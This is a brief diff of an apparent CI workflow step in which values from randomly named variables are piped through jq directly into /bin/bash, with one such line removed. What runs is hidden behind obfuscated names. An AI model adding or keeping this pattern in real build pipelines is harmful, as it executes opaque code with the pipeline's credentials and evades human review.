@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$arp57920" | jq -r .kq11901 | /bin/bash
           echo $vnv71 | jq -r .d251 | /bin/bash
-          echo $m42 | jq -r .gpeav8 | /bin/bash
           echo $dlohg5 | jq -r .reew37509 | /bin/bash
 
       - name: Store results
